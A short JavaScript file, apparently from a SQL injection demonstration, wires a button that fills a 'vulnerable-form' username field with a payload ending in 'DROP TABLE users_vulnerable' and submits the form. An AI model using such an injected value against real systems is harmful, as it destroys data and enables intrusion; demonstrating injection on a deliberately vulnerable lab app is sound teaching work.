document.addEventListener('DOMContentLoaded', function () {

    const injectBtn = document.getElementById('inject-btn');
    const form = document.getElementById('vulnerable-form');

    if (!injectBtn || !form) {
        return;
    }

    injectBtn.addEventListener('click', function () {

        document.getElementById('username').value =
            "hacker', 'x'); DROP TABLE users_vulnerable; -- ";

        document.getElementById('password').value = "doesnt_matter";

        form.submit();
    });
});

